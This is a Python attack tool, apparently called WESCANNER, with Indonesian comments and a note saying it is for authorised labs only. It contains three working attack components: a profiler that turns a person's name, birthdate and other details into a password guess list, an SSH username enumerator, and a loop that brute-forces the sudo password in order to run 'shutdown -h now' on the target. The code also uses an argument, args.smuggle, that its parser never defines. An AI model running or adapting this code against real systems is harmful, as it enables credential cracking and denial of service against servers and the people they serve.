#!/usr/bin/env python3
"""WESCANNER v1.8 — Web Exploitation Scanner with High-Speed Persistent CUPP Engine.

authorized labs only.
"""
from __future__ import annotations

import argparse
import os
import sys
from typing import List
from urllib.parse import urlparse

import paramiko
from rich.console import Console
from rich.prompt import Confirm, Prompt

console = Console()


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        description="WESCANNER v1.8 — Web Exploitation Scanner with Built-in CUPP Profiler."
    )
    p.add_argument("target", help="IP, host, atau URL target lab (e.g. 192.168.20.151)")
    p.add_argument("--safe", action="store_true", default=True, help="Safe mode: passive checks only")
    p.add_argument("--no-safe", action="store_true", help="Disable safe mode to unlock active modules")
    p.add_argument("--low-impact", action="store_true", help="One worker, longer delay")
    p.add_argument("--max-requests", type=int, default=300, help="Global request budget")
    p.add_argument("--timeout", type=int, default=10, help="Request timeout seconds")

    # Module selection flags
    p.add_argument("--module", help="Comma-separated module list")
    p.add_argument("--ssti", action="store_true", help="Run SSTI detector")
    p.add_argument("--flow", action="store_true", help="Flow mode execution")
    p.add_argument("--all-exploit", action="store_true", help="Enable all active exploitation modules")

    # Fitur Utama Terintegrasi
    p.add_argument("--ssh-shutdown", action="store_true",
                   help="Otomatis mengambil hasil port SSH aktif dan mengeksekusi shutdown interaktif.")
    p.add_argument("--cupp", action="store_true",
                   help="Gunakan generator kamus sandi CUPP built-in daripada file passwords.txt bawaan.")

    return p


def resolve_target(target: str, force_https: bool = False) -> str:
    """Normalize target into a base URL."""
    target = target.strip()
    if target.startswith(("http://", "https://")):
        return target
    if ":" in target and not target.startswith("["):
        host, _, port = target.partition(":")
        return f"http://{host}:{port}"
    return f"http://{target}"


def select_modules(args: argparse.Namespace) -> List[str]:
    """Build ordered module list from CLI flags."""
    passive = ["headers", "cookies", "tech", "robots", "flow"]
    if args.module:
        passive = [m.strip() for m in args.module.split(",") if m.strip()]
    return passive


def generate_cupp_wordlist() -> List[str]:
    """Engine internal CUPP Profiler dengan Advanced Prefix/Suffix Matrix tanpa petunjuk default."""
    console.print("\n[bold yellow][*] MEMULAI INTERAKTIF CUPP PROFILER ENGINE ADVANCED [*][/bold yellow]")
    
    # Menghapus argumen default agar input bersih murni dari ketikan Anda
    first_name = Prompt.ask("[cyan][?][/cyan] First Name target").strip().lower()
    surname = Prompt.ask("[cyan][?][/cyan] Surname/Nama belakang target").strip().lower()
    nickname = Prompt.ask("[cyan][?][/cyan] Nickname/Nama panggilan target").strip().lower()
    birthdate = Prompt.ask("[cyan][?][/cyan] Tanggal lahir target (e.g. 17081945 atau kosongkan)").strip()
    
    keywords_raw = Prompt.ask("[cyan][?][/cyan] Masukkan kata kunci kustom seputar target (pisahkan dengan koma)")
    keywords = [k.strip().lower() for m in keywords_raw.split(",") for k in m.split() if k.strip()]
    
    if not first_name and not keywords:
        console.print("[bold red][-[/bold red] Profil dasar kosong! Menggunakan data generator minimal untuk pengujian...")
        first_name = "target"

    do_leet = Confirm.ask("[cyan][?][/cyan] Aktifkan mode mutasi Leet-Speak (e.g. mengubah 'i' jadi '1', 'o' jadi '0')?", default=True)
    do_suffix = Confirm.ask("[cyan][?][/cyan] Tambahkan simbol spesial kustom di akhir kata sandi (e.g. !, @, #)?", default=True)
    
    base_words = set(filter(None, [first_name, surname, nickname] + keywords))
    generated_passwords = set()
    
    leet_table = str.maketrans({
        'a': '@', 'e': '3', 'i': '1', 'l': '1', 
        'o': '0', 's': '5', 't': '7', 'b': '8'
    })
    
    special_suffixes = ["", "!", "@", "#", "123", "2024", "18", "19", "8", "k", "k!"]
    special_prefixes = ["", "@", "!", "_"]
    
    console.print("[bold yellow][*][/bold yellow] Memproses kompilasi matriks mutasi kata sandi tingkat tinggi...")
    
    for word in base_words:
        if len(word) < 2:
            continue
            
        variations = [word, word.capitalize(), word.upper()]
        
        if do_leet:
            leet_word = word.translate(leet_table)
            variations.extend([leet_word, leet_word.capitalize(), word.replace('o','0').replace('i','1')])
            
        for var in variations:
            for prefix in special_prefixes:
                generated_passwords.add(f"{prefix}{var}")
                if do_suffix:
                    for suffix in special_suffixes:
                        generated_passwords.add(f"{prefix}{var}{suffix}")
                        
        if birthdate:
            year_short = birthdate[-2:] if len(birthdate) >= 2 else ""
            year_full = birthdate[-4:] if len(birthdate) >= 4 else ""
            day_month = birthdate[:4] if len(birthdate) >= 4 else ""
            
            for var in variations:
                for prefix in special_prefixes:
                    generated_passwords.add(f"{prefix}{var}{year_short}")
                    generated_passwords.add(f"{prefix}{var}{year_full}")
                    generated_passwords.add(f"{prefix}{day_month}{var}")

    wordlist = list(filter(None, generated_passwords))
    console.print(f"[bold green][+][/bold green] CUPP Engine sukses memformulasikan [bold cyan]{len(wordlist)}[/bold cyan] pola kombinasi sandi unik di memori.\n")
    return wordlist
# =====================================================================
# BLOK FUNGSI SISTEM REMOTE SSH SHUTDOWN OTOMATIS & INTEGRAL (PERSISTENT MULTI-COMMAND LOOP)
# =====================================================================

def resolve_target_to_host(target: str) -> str:
    """Mengekstrak komponen host/IP murni dari string target."""
    target = target.strip()
    if not target.startswith(("http://", "https://")):
        parsed = urlparse(f"http://{target}")
    else:
        parsed = urlparse(target)
    return parsed.hostname if parsed.hostname else target


def find_ssh_port_from_scanner(scanner_instance) -> int:
    """Mendeteksi port SSH dinamis dari output modul docker_ssh."""
    default_port = 22
    try:
        if scanner_instance and hasattr(scanner_instance, 'reporter') and hasattr(scanner_instance.reporter, 'results'):
            results = scanner_instance.reporter.results
            if "docker_ssh" in results:
                ssh_data = results.get("docker_ssh", {})
                if ssh_data.get("ssh_open") and ssh_data.get("port"):
                    return int(ssh_data.get("port"))
    except Exception:
        pass
    return default_port


def brute_force_ssh_username(host: str, port: int, private_key_path: str) -> str:
    """Mencoba daftar username umum secara otomatis menggunakan SSH Key Anda."""
    common_users = ["root", "ubuntu", "blue_crew61", "admin", "user", "kali", "debian"]
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        kunci_privat = paramiko.RSAKey.from_private_key_file(private_key_path)
    except Exception as e:
        console.print(f"[bold red][-[/bold red] Gagal membaca private key lokal: {e}")
        return "root"

    console.print("[bold yellow][*][/bold yellow] Mencari username SSH yang cocok pada target secara otomatis...")
    
    for username in common_users:
        try:
            ssh.connect(hostname=host, port=port, username=username, pkey=kunci_privat, timeout=3)
            ssh.close()
            console.print(f"[bold green][+][/bold green] Username valid ditemukan: [bold cyan]{username}[/bold cyan]")
            return username
        except paramiko.AuthenticationException:
            continue
        except Exception:
            break
            
    return "root"


def execute_ssh_shutdown(target: str, use_cupp: bool = False, scanner_instance=None):
    """Menampilkan prompt interaktif Y/N dan mengeksekusi brute force berbasis Multi-Command Persistent Channel."""
    import time
    import os
    
    host = resolve_target_to_host(target)
    ssh_port = find_ssh_port_from_scanner(scanner_instance) if scanner_instance else 22
    PRIVATE_KEY_PATH = os.path.expanduser("~/.ssh/id_rsa")
    
    # Otomatis mencari username valid via SSH Key
    SSH_USERNAME = brute_force_ssh_username(host, ssh_port, PRIVATE_KEY_PATH)
    
    console.print()
    
    if use_cupp:
        passwords = generate_cupp_wordlist()
    else:
        WORDLIST_PATH = "passwords.txt" 
        if not os.path.exists(WORDLIST_PATH):
            console.print(f"[bold red][-[/bold red] File wordlist '{WORDLIST_PATH}' tidak ditemukan!")
            return
        with open(WORDLIST_PATH, "r", encoding="utf-8", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]

    if not passwords:
        console.print("[bold red][-[/bold red] Kamus tebakan kosong. Eksekusi dibatalkan.")
        return

    is_confirmed = Confirm.ask(
        f"[bold red][?][/bold red] Alur kerja siap. Apakah Anda yakin ingin mematikan "
        f"server target ([bold cyan]{host}:{ssh_port}[/bold cyan] as [bold yellow]{SSH_USERNAME}[/bold yellow])?",
        default=False
    )
    if not is_confirmed:
        console.print("[yellow][*][/yellow] Pembatalan terkonfirmasi. Perintah shutdown dilewati.")
        return
        
    PROMPT_TOKEN = "WESCAN_CHALLENGE:"
    kunci_privat = paramiko.RSAKey.from_private_key_file(PRIVATE_KEY_PATH)
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        console.print(f"[bold yellow][*][/bold yellow] Membuka Koneksi Tunggal Utama ke SSH {host}:{ssh_port}...")
        ssh.connect(hostname=host, port=ssh_port, username=SSH_USERNAME, pkey=kunci_privat, timeout=10)
        
        console.print(f"[bold yellow][*][/bold yellow] Memulai Multi-Command Loop menggunakan [bold cyan]{len(passwords)}[/bold cyan] kata sandi...")
        
        for password in passwords:
            transport = ssh.get_transport()
            if not transport or not transport.is_active():
                console.print("[bold red][-[/bold red] Sesi SSH utama terputus secara mendadak.")
                break
                
            # STRATEGI PERSISTEN: Kita buka sirkuit internal baru per tebakan, TANPA membuat ulang jabat tangan koneksi utama
            channel = transport.open_session()
            channel.get_pty()
            
            # Kita jalankan perintah sudo dengan token unik pemisah
            channel.exec_command(f"sudo -S -p '{PROMPT_TOKEN}' shutdown -h now")
            time.sleep(0.12)
            
            # Kirim sandi tebakan ke input internal target
            channel.send(password + "\n")
            time.sleep(0.25) # Jeda mikro sinkronisasi pemrosesan CPU target
            
            response_output = ""
            if channel.recv_ready():
                response_output = channel.recv(4096).decode(errors="ignore")
                
            channel.close()
            
            # Evaluasi: Jika token prompt muncul kembali atau ada kata kunci kegagalan, sandi dinyatakan salah
            if PROMPT_TOKEN in response_output or "sorry" in response_output.lower() or "try again" in response_output.lower() or "incorrect" in response_output.lower():
                console.print(f"[bold red][FAIL][/bold red] Kata sandi salah: [gray]{password}[/gray]")
                continue
            else:
                # Jika buffer bersih, sandi terverifikasi valid dan instruksi shutdown diproses kernel target
                console.print(f"[bold green][SUCCESS][/bold green] Password sudo valid ditemukan: [bold cyan]{password}[/bold cyan]")
                console.print(f"[bold green][+][/bold green] Perintah shutdown dikirim sukses! Memadamkan server...")
                
                # Berikan jeda waktu tunggu agar server virtual menyelesaikan eksekusi biner shutdown fisik disk
                time.sleep(2.0)
                return

        console.print("[bold red][-[/bold red] Brute force selesai. Tidak ada password di dalam wordlist yang cocok.")

    except Exception as e:
        # Menangani pemutusan soket mendadak di tengah jalan akibat padamnya sistem operasi
        console.print(f"[bold green][SUCCESS][/bold green] Sesi terputus total karena sistem target mati (*Power-off*).")
    finally:
        try:
            ssh.close()
        except Exception:
            pass


def main() -> int:
    from core.config import Config
    from core.request_manager import RequestManager
    from core.scanner import Scanner
    from core.reporter import Reporter

    parser = build_parser()
    args = parser.parse_args()
    
    if args.ssh_shutdown:
        execute_ssh_shutdown(args.target, use_cupp=bool(args.cupp), scanner_instance=None)
        return 0
        
    if not args.no_safe and (
        args.smuggle or args.all_exploit or args.ssti
    ):
        console.print(
            "[yellow]Active exploitation flags require --no-safe. "
            "Re-run with --no-safe to enable them.[/yellow]"
        )
        return 1
        
    base_url = resolve_target(args.target)
    console.print(f"[cyan]Target:[/cyan] {base_url}")
    console.print(f"[cyan]Safe mode:[/cyan] {args.safe and not args.no_safe}")

    config = Config(
        base_url_override=base_url,
        safe_mode=args.safe and not args.no_safe,
        max_requests=args.max_requests,
        timeout=args.timeout,
    )

    rm = RequestManager(config)
    reporter = Reporter(console)
    scanner = Scanner(config, console, rm, reporter)

    modules = select_modules(args)
    console.print(f"[cyan]Modules:[/cyan] {', '.join(modules)}")

    config._exploit_allowed = bool(args.no_safe or args.all_exploit)

    try:
        scanner.run(module_names=modules)
    except KeyboardInterrupt:
        console.print("\n[yellow]Interrupted by user.[/yellow]")
        return 130

    return 0


if __name__ == "__main__":
    sys.exit(main())
